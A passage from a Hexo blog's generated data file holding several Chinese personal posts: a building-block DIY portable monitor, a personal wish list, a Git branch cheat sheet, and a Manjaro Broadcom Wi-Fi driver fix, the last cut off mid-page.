屏幕的教程，看了下效果很不错，于是我想来想去还是下单买了需要的材料，话不多说，DIY 开始！\n\n<!--more-->\n\n# 说明\n\n没什么可说的，就照着教程做就行了。\n\n我的屏幕是 14 寸 2k 100 色域的，驱动板配套买的，花了￥ 500 元，这是占大头的部分，\n\n积木我由于不确定要多少所以照着上面链接买的，￥ 120 元，结果因为他是 15.6 寸屏幕，而且我没有把按键板放在边框，所以剩下 10 包白色积木 2 包橙色积木，不过我自觉成品是比他薄一点的（也相对减少了工作量）。\n\n~~东西是这周到的，人是今天走的。~~\n\n建议自己想尝试并且手上有屏幕的去淘宝买个驱动板，没有的就看自己意愿咯。\n\n文章说了，本人也亲自体验过了，真的真的是非常需要耐心，而且积木拼多了手指头痛死了，大拇指和食指指缝的肉分离了一点点，痛了两天，而且估计还要痛下去，十指连心啊。。。\n\n![手指](diy-screen/DIYScreen_my_hand.png '被摧残过的手')\n\n# 过程记录\n\n一小时的成果（由于刚拼积木不熟练），就拼了一个角。\n\n![一小时](diy-screen/DIYScreen_1hour.png '耐心')\n\n一早上的成果，龙猫。\n\n![一早上](diy-screen/DIYScreen_1morning.png '耐心')\n\n一天的成果，背板。\n\n![一天](diy-screen/DIYScreen_1day.png '耐心')\n\n期间自己拼了一下自己的名字，由于黑色拼白色有点不好看而且黑色积木可能不够遂放弃，改用橙色。\n\n![名字](diy-screen/DIYScreen_my_name.png '黑色积木确实不够')\n\n开始放驱动板，往上叠边框，还得压实，太难了。\n\n![快好了](diy-screen/DIYScreen_closing1.png '耐心')\n\n叠好边框放屏幕，前背板本来不想剪的结果试了一下会压到屏幕，还是乖乖剪吧（手好酸）。\n\n![差一点了](diy-screen/DIYScreen_closing2.png '耐心')\n\n# 成果展示\n\n终于终于在第二天完成了，也有空写下这篇文章记录了。\n\n前面\n\n![前面](diy-screen/DIYScreen_finish1.png 'Yay!')\n\n后面\n\n![后面](diy-screen/DIYScreen_finish2.png 'Yay!')\n\n开机\n\n![开机](diy-screen/DIYScreen_finish3.png 'Yay!')\n\n哈哈哈，我的动手能力还是可以的嘛，咱今儿那叫一个高兴！\n\n# 参考文章\n\n- [如何低价 DIY 一个便携式显示器](https://zhuanlan.zhihu.com/p/143726050)\n","slug":"2021/03/diy-screen","published":1,"updated":"2022-07-23T14:41:42.287Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj0000vzge33sar06xb","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>我本来是想买一个屏幕的，也一直在看买哪种屏幕好，主要是我买了一个 SWITCH，想用来放大一点玩游戏，也为以后自主装机时不用再去买一块屏幕，一举多得。但后来仔细一想，宿舍里我桌面上没什么空间放东西，也没插座，想了想就暂时算了，还是以后自己租房攒机时再买。但机缘巧合下我看到了 DIY 屏幕的教程，看了下效果很不错，于是我想来想去还是下单买了需要的材料，话不多说，DIY 开始！</p>\n<span id=\"more\"></span>\n\n<h1 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h1><p>没什么可说的，就照着教程做就行了。</p>\n<p>我的屏幕是 14 寸 2k 100 色域的，驱动板配套买的，花了￥ 500 元，这是占大头的部分，</p>\n<p>积木我由于不确定要多少所以照着上面链接买的，￥ 120 元，结果因为他是 15.6 寸屏幕，而且我没有把按键板放在边框，所以剩下 10 包白色积木 2 包橙色积木，不过我自觉成品是比他薄一点的（也相对减少了工作量）。</p>\n<p><del>东西是这周到的，人是今天走的。</del></p>\n<p>建议自己想尝试并且手上有屏幕的去淘宝买个驱动板，没有的就看自己意愿咯。</p>\n<p>文章说了，本人也亲自体验过了，真的真的是非常需要耐心，而且积木拼多了手指头痛死了，大拇指和食指指缝的肉分离了一点点，痛了两天，而且估计还要痛下去，十指连心啊。。。</p>\n<p><img src=\"/diy-screen/DIYScreen_my_hand.png\" alt=\"手指\" title=\"被摧残过的手\"></p>\n<h1 id=\"过程记录\"><a href=\"#过程记录\" class=\"headerlink\" title=\"过程记录\"></a>过程记录</h1><p>一小时的成果（由于刚拼积木不熟练），就拼了一个角。</p>\n<p><img src=\"/diy-screen/DIYScreen_1hour.png\" alt=\"一小时\" title=\"耐心\"></p>\n<p>一早上的成果，龙猫。</p>\n<p><img src=\"/diy-screen/DIYScreen_1morning.png\" alt=\"一早上\" title=\"耐心\"></p>\n<p>一天的成果，背板。</p>\n<p><img src=\"/diy-screen/DIYScreen_1day.png\" alt=\"一天\" title=\"耐心\"></p>\n<p>期间自己拼了一下自己的名字，由于黑色拼白色有点不好看而且黑色积木可能不够遂放弃，改用橙色。</p>\n<p><img src=\"/diy-screen/DIYScreen_my_name.png\" alt=\"名字\" title=\"黑色积木确实不够\"></p>\n<p>开始放驱动板，往上叠边框，还得压实，太难了。</p>\n<p><img src=\"/diy-screen/DIYScreen_closing1.png\" alt=\"快好了\" title=\"耐心\"></p>\n<p>叠好边框放屏幕，前背板本来不想剪的结果试了一下会压到屏幕，还是乖乖剪吧（手好酸）。</p>\n<p><img src=\"/diy-screen/DIYScreen_closing2.png\" alt=\"差一点了\" title=\"耐心\"></p>\n<h1 id=\"成果展示\"><a href=\"#成果展示\" class=\"headerlink\" title=\"成果展示\"></a>成果展示</h1><p>终于终于在第二天完成了，也有空写下这篇文章记录了。</p>\n<p>前面</p>\n<p><img src=\"/diy-screen/DIYScreen_finish1.png\" alt=\"前面\" title=\"Yay!\"></p>\n<p>后面</p>\n<p><img src=\"/diy-screen/DIYScreen_finish2.png\" alt=\"后面\" title=\"Yay!\"></p>\n<p>开机</p>\n<p><img src=\"/diy-screen/DIYScreen_finish3.png\" alt=\"开机\" title=\"Yay!\"></p>\n<p>哈哈哈，我的动手能力还是可以的嘛，咱今儿那叫一个高兴！</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/143726050\">如何低价 DIY 一个便携式显示器</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>我本来是想买一个屏幕的，也一直在看买哪种屏幕好，主要是我买了一个 SWITCH，想用来放大一点玩游戏，也为以后自主装机时不用再去买一块屏幕，一举多得。但后来仔细一想，宿舍里我桌面上没什么空间放东西，也没插座，想了想就暂时算了，还是以后自己租房攒机时再买。但机缘巧合下我看到了 DIY 屏幕的教程，看了下效果很不错，于是我想来想去还是下单买了需要的材料，话不多说，DIY 开始！</p>","more":"<h1 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h1><p>没什么可说的，就照着教程做就行了。</p>\n<p>我的屏幕是 14 寸 2k 100 色域的，驱动板配套买的，花了￥ 500 元，这是占大头的部分，</p>\n<p>积木我由于不确定要多少所以照着上面链接买的，￥ 120 元，结果因为他是 15.6 寸屏幕，而且我没有把按键板放在边框，所以剩下 10 包白色积木 2 包橙色积木，不过我自觉成品是比他薄一点的（也相对减少了工作量）。</p>\n<p><del>东西是这周到的，人是今天走的。</del></p>\n<p>建议自己想尝试并且手上有屏幕的去淘宝买个驱动板，没有的就看自己意愿咯。</p>\n<p>文章说了，本人也亲自体验过了，真的真的是非常需要耐心，而且积木拼多了手指头痛死了，大拇指和食指指缝的肉分离了一点点，痛了两天，而且估计还要痛下去，十指连心啊。。。</p>\n<p><img src=\"/diy-screen/DIYScreen_my_hand.png\" alt=\"手指\" title=\"被摧残过的手\"></p>\n<h1 id=\"过程记录\"><a href=\"#过程记录\" class=\"headerlink\" title=\"过程记录\"></a>过程记录</h1><p>一小时的成果（由于刚拼积木不熟练），就拼了一个角。</p>\n<p><img src=\"/diy-screen/DIYScreen_1hour.png\" alt=\"一小时\" title=\"耐心\"></p>\n<p>一早上的成果，龙猫。</p>\n<p><img src=\"/diy-screen/DIYScreen_1morning.png\" alt=\"一早上\" title=\"耐心\"></p>\n<p>一天的成果，背板。</p>\n<p><img src=\"/diy-screen/DIYScreen_1day.png\" alt=\"一天\" title=\"耐心\"></p>\n<p>期间自己拼了一下自己的名字，由于黑色拼白色有点不好看而且黑色积木可能不够遂放弃，改用橙色。</p>\n<p><img src=\"/diy-screen/DIYScreen_my_name.png\" alt=\"名字\" title=\"黑色积木确实不够\"></p>\n<p>开始放驱动板，往上叠边框，还得压实，太难了。</p>\n<p><img src=\"/diy-screen/DIYScreen_closing1.png\" alt=\"快好了\" title=\"耐心\"></p>\n<p>叠好边框放屏幕，前背板本来不想剪的结果试了一下会压到屏幕，还是乖乖剪吧（手好酸）。</p>\n<p><img src=\"/diy-screen/DIYScreen_closing2.png\" alt=\"差一点了\" title=\"耐心\"></p>\n<h1 id=\"成果展示\"><a href=\"#成果展示\" class=\"headerlink\" title=\"成果展示\"></a>成果展示</h1><p>终于终于在第二天完成了，也有空写下这篇文章记录了。</p>\n<p>前面</p>\n<p><img src=\"/diy-screen/DIYScreen_finish1.png\" alt=\"前面\" title=\"Yay!\"></p>\n<p>后面</p>\n<p><img src=\"/diy-screen/DIYScreen_finish2.png\" alt=\"后面\" title=\"Yay!\"></p>\n<p>开机</p>\n<p><img src=\"/diy-screen/DIYScreen_finish3.png\" alt=\"开机\" title=\"Yay!\"></p>\n<p>哈哈哈，我的动手能力还是可以的嘛，咱今儿那叫一个高兴！</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/143726050\">如何低价 DIY 一个便携式显示器</a></li>\n</ul>"},{"title":"白日做梦","date":"2021-03-21T04:00:00.000Z","_content":"\n# 后续更多有待补充\n\n<!--more-->\n\n1. 做一个博客网站\n\n   > ~~利用了 github 网站和前端页面模板，勉勉强强算是达成了吧~~（可惜了我的服务器和域名，都过期了我还没投入使用过），20210321\n   >\n   > ~~用 Hexo 重新搭建了博客页面，更美观实用~~，20210821\n\n2. 组装一台主机\n\n   > ~~么得钱，么得私人空间~~\n   >\n   > 5800x + 6700xt，问题来了，能用几年呢？20211001\n\n3. 学会弹吉他\n\n   > 在学了在学了（~~你猜我到底有没有好好练~~，答案是否定的 20210614）\n\n4. 买一台 macbook pro\n\n   > ~~14 寸出了再说~~\n   >\n   > 买了买了，14 寸 m1 pro，初体验感觉很棒！20220723\n   >\n   > ~~在自己的 ideapad 700-15isk 上装了黑苹果过过瘾~~，可以退休了\n\n5. 给老爸老妈买新衣服\n\n   > ~~给老妈买了两件裙子，还有配套的鞋~~，20210215\n\n6. 给老爸老妈换手机\n\n   > ~~给老妈换了 Iphone 12~~，20210215\n   >\n   > ~~给老爸买了 Mate 40~~，20210601\n\n7. 找到女朋友（难啊）\n\n   > ~~第一次鼓起勇气踏出去的脚被拦住了~~，20220702\n\n8. 考驾照\n\n9. DIY 屏幕\n\n   > [DIY 屏幕](https://ashestar.github.io/diy/2021/03/28/DIY%E5%B1%8F%E5%B9%95.html)，~~做到了做到了~~，20210328\n\n10. 。。。\n","source":"_posts/2021/03/todo-list.md","raw":"---\ntitle: 白日做梦\ndate: 2021-03-21 12:00:00\ntags:\n  - Todo\ncategories:\n  - Todo\n---\n\n# 后续更多有待补充\n\n<!--more-->\n\n1. 做一个博客网站\n\n   > ~~利用了 github 网站和前端页面模板，勉勉强强算是达成了吧~~（可惜了我的服务器和域名，都过期了我还没投入使用过），20210321\n   >\n   > ~~用 Hexo 重新搭建了博客页面，更美观实用~~，20210821\n\n2. 组装一台主机\n\n   > ~~么得钱，么得私人空间~~\n   >\n   > 5800x + 6700xt，问题来了，能用几年呢？20211001\n\n3. 学会弹吉他\n\n   > 在学了在学了（~~你猜我到底有没有好好练~~，答案是否定的 20210614）\n\n4. 买一台 macbook pro\n\n   > ~~14 寸出了再说~~\n   >\n   > 买了买了，14 寸 m1 pro，初体验感觉很棒！20220723\n   >\n   > ~~在自己的 ideapad 700-15isk 上装了黑苹果过过瘾~~，可以退休了\n\n5. 给老爸老妈买新衣服\n\n   > ~~给老妈买了两件裙子，还有配套的鞋~~，20210215\n\n6. 给老爸老妈换手机\n\n   > ~~给老妈换了 Iphone 12~~，20210215\n   >\n   > ~~给老爸买了 Mate 40~~，20210601\n\n7. 找到女朋友（难啊）\n\n   > ~~第一次鼓起勇气踏出去的脚被拦住了~~，20220702\n\n8. 考驾照\n\n9. DIY 屏幕\n\n   > [DIY 屏幕](https://ashestar.github.io/diy/2021/03/28/DIY%E5%B1%8F%E5%B9%95.html)，~~做到了做到了~~，20210328\n\n10. 。。。\n","slug":"2021/03/todo-list","published":1,"updated":"2022-07-24T14:58:22.633Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj1000xzge3bv76gcxx","content":"<h1 id=\"后续更多有待补充\"><a href=\"#后续更多有待补充\" class=\"headerlink\" title=\"后续更多有待补充\"></a>后续更多有待补充</h1><span id=\"more\"></span>\n\n<ol>\n<li><p>做一个博客网站</p>\n<blockquote>\n<p><del>利用了 github 网站和前端页面模板，勉勉强强算是达成了吧</del>（可惜了我的服务器和域名，都过期了我还没投入使用过），20210321</p>\n<p><del>用 Hexo 重新搭建了博客页面，更美观实用</del>，20210821</p>\n</blockquote>\n</li>\n<li><p>组装一台主机</p>\n<blockquote>\n<p><del>么得钱，么得私人空间</del></p>\n<p>5800x + 6700xt，问题来了，能用几年呢？20211001</p>\n</blockquote>\n</li>\n<li><p>学会弹吉他</p>\n<blockquote>\n<p>在学了在学了（<del>你猜我到底有没有好好练</del>，答案是否定的 20210614）</p>\n</blockquote>\n</li>\n<li><p>买一台 macbook pro</p>\n<blockquote>\n<p><del>14 寸出了再说</del></p>\n<p>买了买了，14 寸 m1 pro，初体验感觉很棒！20220723</p>\n<p><del>在自己的 ideapad 700-15isk 上装了黑苹果过过瘾</del>，可以退休了</p>\n</blockquote>\n</li>\n<li><p>给老爸老妈买新衣服</p>\n<blockquote>\n<p><del>给老妈买了两件裙子，还有配套的鞋</del>，20210215</p>\n</blockquote>\n</li>\n<li><p>给老爸老妈换手机</p>\n<blockquote>\n<p><del>给老妈换了 Iphone 12</del>，20210215</p>\n<p><del>给老爸买了 Mate 40</del>，20210601</p>\n</blockquote>\n</li>\n<li><p>找到女朋友（难啊）</p>\n<blockquote>\n<p><del>第一次鼓起勇气踏出去的脚被拦住了</del>，20220702</p>\n</blockquote>\n</li>\n<li><p>考驾照</p>\n</li>\n<li><p>DIY 屏幕</p>\n<blockquote>\n<p><a href=\"https://ashestar.github.io/diy/2021/03/28/DIY%E5%B1%8F%E5%B9%95.html\">DIY 屏幕</a>，<del>做到了做到了</del>，20210328</p>\n</blockquote>\n</li>\n<li><p>。。。</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"后续更多有待补充\"><a href=\"#后续更多有待补充\" class=\"headerlink\" title=\"后续更多有待补充\"></a>后续更多有待补充</h1>","more":"<ol>\n<li><p>做一个博客网站</p>\n<blockquote>\n<p><del>利用了 github 网站和前端页面模板，勉勉强强算是达成了吧</del>（可惜了我的服务器和域名，都过期了我还没投入使用过），20210321</p>\n<p><del>用 Hexo 重新搭建了博客页面，更美观实用</del>，20210821</p>\n</blockquote>\n</li>\n<li><p>组装一台主机</p>\n<blockquote>\n<p><del>么得钱，么得私人空间</del></p>\n<p>5800x + 6700xt，问题来了，能用几年呢？20211001</p>\n</blockquote>\n</li>\n<li><p>学会弹吉他</p>\n<blockquote>\n<p>在学了在学了（<del>你猜我到底有没有好好练</del>，答案是否定的 20210614）</p>\n</blockquote>\n</li>\n<li><p>买一台 macbook pro</p>\n<blockquote>\n<p><del>14 寸出了再说</del></p>\n<p>买了买了，14 寸 m1 pro，初体验感觉很棒！20220723</p>\n<p><del>在自己的 ideapad 700-15isk 上装了黑苹果过过瘾</del>，可以退休了</p>\n</blockquote>\n</li>\n<li><p>给老爸老妈买新衣服</p>\n<blockquote>\n<p><del>给老妈买了两件裙子，还有配套的鞋</del>，20210215</p>\n</blockquote>\n</li>\n<li><p>给老爸老妈换手机</p>\n<blockquote>\n<p><del>给老妈换了 Iphone 12</del>，20210215</p>\n<p><del>给老爸买了 Mate 40</del>，20210601</p>\n</blockquote>\n</li>\n<li><p>找到女朋友（难啊）</p>\n<blockquote>\n<p><del>第一次鼓起勇气踏出去的脚被拦住了</del>，20220702</p>\n</blockquote>\n</li>\n<li><p>考驾照</p>\n</li>\n<li><p>DIY 屏幕</p>\n<blockquote>\n<p><a href=\"https://ashestar.github.io/diy/2021/03/28/DIY%E5%B1%8F%E5%B9%95.html\">DIY 屏幕</a>，<del>做到了做到了</del>，20210328</p>\n</blockquote>\n</li>\n<li><p>。。。</p>\n</li>\n</ol>"},{"title":"Git 分支管理","date":"2021-08-22T07:43:45.000Z","_content":"\nGit 进行本地仓库和远程仓库的分支管理。\n\n<!--more-->\n\n# 管理分支\n\n## 本地分支\n\n1. 查看本地分支\n\n   ```bash\n   # 查看分支\n   git branch\n   # 查看所有分支\n   git branch -a\n   ```\n\n   结果\n\n   ```bash\n   # *号表示的是当前分支\n   * master\n   ```\n\n2. 新建本地分支\n\n   ```bash\n   git branch [branch name]\n   ```\n\n3. 切换分支\n\n   ```bash\n   git checkout [branch name]\n   ```\n\n4. 创建&切换分支\n\n   ```bash\n   # 创建分支的同时切换到该分支\n   git checkout -b [branch name]\n   ```\n\n5. 删除分支\n\n   ```bash\n   git branch -d [branch name]\n   ```\n\n6. 将分支推送到远程仓库\n\n   ```bash\n   git push origin [branch name]\n   ```\n\n## 远程分支\n\n1. 查看远程分支\n\n   ```bash\n   git branch -r\n   ```\n\n2. 删除远程分支\n\n   ```bash\n   # 分支名称前的冒号代表删除\n   git push origin :[branch name]\n   ```\n\n# 参考文章\n\n[git 创建新分支，并将本地代码提交到新分支上](https://blog.csdn.net/chen134225/article/details/95475960)\n","source":"_posts/2021/08/Git分支管理.md","raw":"---\ntitle: Git 分支管理\ndate: 2021-08-22 15:43:45\ntags:\n  - Git\ncategories:\n  - Git\n---\n\nGit 进行本地仓库和远程仓库的分支管理。\n\n<!--more-->\n\n# 管理分支\n\n## 本地分支\n\n1. 查看本地分支\n\n   ```bash\n   # 查看分支\n   git branch\n   # 查看所有分支\n   git branch -a\n   ```\n\n   结果\n\n   ```bash\n   # *号表示的是当前分支\n   * master\n   ```\n\n2. 新建本地分支\n\n   ```bash\n   git branch [branch name]\n   ```\n\n3. 切换分支\n\n   ```bash\n   git checkout [branch name]\n   ```\n\n4. 创建&切换分支\n\n   ```bash\n   # 创建分支的同时切换到该分支\n   git checkout -b [branch name]\n   ```\n\n5. 删除分支\n\n   ```bash\n   git branch -d [branch name]\n   ```\n\n6. 将分支推送到远程仓库\n\n   ```bash\n   git push origin [branch name]\n   ```\n\n## 远程分支\n\n1. 查看远程分支\n\n   ```bash\n   git branch -r\n   ```\n\n2. 删除远程分支\n\n   ```bash\n   # 分支名称前的冒号代表删除\n   git push origin :[branch name]\n   ```\n\n# 参考文章\n\n[git 创建新分支，并将本地代码提交到新分支上](https://blog.csdn.net/chen134225/article/details/95475960)\n","slug":"2021/08/Git分支管理","published":1,"updated":"2022-07-23T14:41:42.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj10011zge323q4bqqz","content":"<p>Git 进行本地仓库和远程仓库的分支管理。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"管理分支\"><a href=\"#管理分支\" class=\"headerlink\" title=\"管理分支\"></a>管理分支</h1><h2 id=\"本地分支\"><a href=\"#本地分支\" class=\"headerlink\" title=\"本地分支\"></a>本地分支</h2><ol>\n<li><p>查看本地分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看分支</span></span><br><span class=\"line\">git branch</span><br><span class=\"line\"><span class=\"comment\"># 查看所有分支</span></span><br><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># *号表示的是当前分支</span></span><br><span class=\"line\">* master</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>新建本地分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建&amp;切换分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建分支的同时切换到该分支</span></span><br><span class=\"line\">git checkout -b [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>将分支推送到远程仓库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin [branch name]</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"远程分支\"><a href=\"#远程分支\" class=\"headerlink\" title=\"远程分支\"></a>远程分支</h2><ol>\n<li><p>查看远程分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -r</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除远程分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 分支名称前的冒号代表删除</span></span><br><span class=\"line\">git push origin :[branch name]</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://blog.csdn.net/chen134225/article/details/95475960\">git 创建新分支，并将本地代码提交到新分支上</a></p>\n","site":{"data":{}},"excerpt":"<p>Git 进行本地仓库和远程仓库的分支管理。</p>","more":"<h1 id=\"管理分支\"><a href=\"#管理分支\" class=\"headerlink\" title=\"管理分支\"></a>管理分支</h1><h2 id=\"本地分支\"><a href=\"#本地分支\" class=\"headerlink\" title=\"本地分支\"></a>本地分支</h2><ol>\n<li><p>查看本地分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看分支</span></span><br><span class=\"line\">git branch</span><br><span class=\"line\"><span class=\"comment\"># 查看所有分支</span></span><br><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># *号表示的是当前分支</span></span><br><span class=\"line\">* master</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>新建本地分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建&amp;切换分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建分支的同时切换到该分支</span></span><br><span class=\"line\">git checkout -b [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d [branch name]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>将分支推送到远程仓库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin [branch name]</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"远程分支\"><a href=\"#远程分支\" class=\"headerlink\" title=\"远程分支\"></a>远程分支</h2><ol>\n<li><p>查看远程分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -r</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除远程分支</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 分支名称前的冒号代表删除</span></span><br><span class=\"line\">git push origin :[branch name]</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://blog.csdn.net/chen134225/article/details/95475960\">git 创建新分支，并将本地代码提交到新分支上</a></p>"},{"title":"Linux驱动博通无线网卡","date":"2021-08-25T13:00:00.000Z","_content":"\n解决基于 Arch Linux 的 Linux 发行版 Manjaro 无法识别博通无线网卡驱动的问题。\n\n<!--more-->\n\n# 问题描述\n\n- 找不到无线网络\n- 找不到无线开关\n\n# 解决\n\n1. 更新系统软件\n\n```bash\nsudo pacman -Syu\n```\n\n2. 安装对应的 linux-headers，可在设置查看对应的内核版本\n\n```bash\nsudo pacman -S linux-headers\n```\n\n3. 安装博通网卡驱动\n\n```bash\nsudo pacman -S broadcom-wl-dkms\n```\n\n4. 重启电脑，这时候应该就解决问题了，输入以下命令验证\n\n```bash\ndkms status\n# 出现类似信息说明成功\n# broadcom-wl, 6.30.223.271, 5.10.59-1-MANJARO, x86_64: installed\n```\n\n# 参考文章\n\n[论如何在 linux 上正确驱动博通网卡](https://rowe98.github.io/2019/07/19/bodcom_failure/)\n","source":"_posts/2021/08/Linux驱动博通无线网卡.md","raw":"---\ntitle: Linux驱动博通无线网卡\ndate: 2021-08-25 21:00:00\ntags:\n  - 配置\n  - Linux\ncategories:\n  - 配置\n  - Linux\n---\n\n解决基于 Arch Linux 的 Linux 发行版 Manjaro 无法识别博通无线网卡驱动的问题。\n\n<!--more-->\n\n# 问题描述\n\n- 找不到无线网络\n- 找不到无线开关\n\n# 解决\n\n1. 更新系统软件\n\n```bash\nsudo pacman -Syu\n```\n\n2. 安装对应的 linux-headers，可在设置查看对应的内核版本\n\n```bash\nsudo pacman -S linux-headers\n```\n\n3. 安装博通网卡驱动\n\n```bash\nsudo pacman -S broadcom-wl-dkms\n```\n\n4. 重启电脑，这时候应该就解决问题了，输入以下命令验证\n\n```bash\ndkms status\n# 出现类似信息说明成功\n# broadcom-wl, 6.30.223.271, 5.10.59-1-MANJARO, x86_64: installed\n```\n\n# 参考文章\n\n[论如何在 linux 上正确驱动博通网卡](https://rowe98.github.io/2019/07/19/bodcom_failure/)\n","slug":"2021/08/Linux驱动博通无线网卡","published":1,"updated":"2022-09-26T15:03:49.454Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj10013zge30doy6eu2","content":"<p>解决基于 Arch Linux 的 Linux 发行版 Manjaro 无法识别博通无线网卡驱动的问题。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h1><ul>\n<li>找不到无线网络</li>\n<li>找不到无线开关</li>\n</ul>\n<h1 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h1><ol>\n<li>更新系统软件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -Syu</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装对应的 linux-headers，可在设置查看对应的内核版本</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S linux-headers</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装博通网卡驱动</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S broadcom-wl-dkms</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启电脑，这时候应该就解决问题了，输入以下命令验证</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span 